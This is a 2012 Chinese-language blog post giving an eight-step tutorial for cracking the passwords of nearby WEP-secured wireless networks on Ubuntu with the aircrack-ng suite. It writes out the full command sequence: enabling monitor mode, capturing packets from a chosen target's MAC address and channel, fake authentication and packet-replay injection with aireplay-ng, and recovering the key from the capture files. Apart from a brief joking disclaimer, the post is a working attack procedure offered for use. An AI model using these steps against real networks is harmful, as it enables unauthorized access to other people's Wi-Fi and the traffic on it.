---
title: Ubuntu 无线密码破解利器aircrack-ng
tags:
  - Linux
id: 511
categories:
  - Linux
date: 2012-01-08 12:12:49
---

想必搞过破解的朋友们都会知道bt3 bt4等linux下的无线破解工具吧，在ubuntu系统下同样有着一款破解功能强大的工具，那就是aircrack-ng。放这篇文章出来只是做技术上的交流，奶牛可不希望谁用这个做坏事儿哦~~~嘿嘿，破解开始咯：

测试平台 Y450 T6600 2.1G ubuntu 10.04 成功

1.下载安装aircrack-ng，奶牛直接从源中安装的。
sudo apt-get install aircrack-ng

2.启动无线，这里奶牛需要说明一下，很多朋友的无线可能在windows系统中是禁用或者是系统自带的电源管理系统中未开启无线的，这种情况下需要先在win状态下开启之后才能在ubuntu中开启无线。开启完成后进入ubuntu ，开一个终端，ifconfig -a看看wlan是否开启，开启正常可进行下一步。

3.准备工作完成，开始破解。开启终端①，
sudo airmon-ng start wlan0

sudo airodump-ng mon0<!--more-->

这时会看到无线的地址出现在屏幕上，这里有显示它们的mac地址以及所在频道。ok，ctrl+c退出，在这里我们选择类型为wep的无线为破解对象。我们需要记录它所在的频道以及mac地址。

4.开启终端②
sudo airodump-ng --channel 频道 --bssid 目标主机mac地址 -w wep mon0

这里的wep为默认的存包文件的名字，可以更改。

5.开启终端③
sudo aireplay-ng -1 0 -a 目标mac -h 本机MAC地址 mon0

（本机的mac可以开启一个新的终端用ifconfig -a来查询）

这时会有成功字样显示，如果没有显示可能就是目标不支持或者系统部稳定，需要更换目标了。显示成功后进行下步。

6.继续输入
sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 目标MAC地址 -h 本机MAC地址 mon0

此时终端②中的数据会增长很快，当数据到达5000的时候就可以破解了。

7.开启终端 ④
sudo aircrack-ng wep*.cap

这时就开始破解了，如果你进行过多组，可能会有多组结果，你可以用数字123进行选择，如果不出意外你已经破解出来这组无线的密码了。

8.最后 结束监控过程
sudo airmon-ng stop mon0

( sudo airomon-ng check可以查看你开启了多少监控，如果运行多组的时候可以查看后选择关闭)。

本文链接地址: Ubuntu 无线密码破解利器aircrack-ng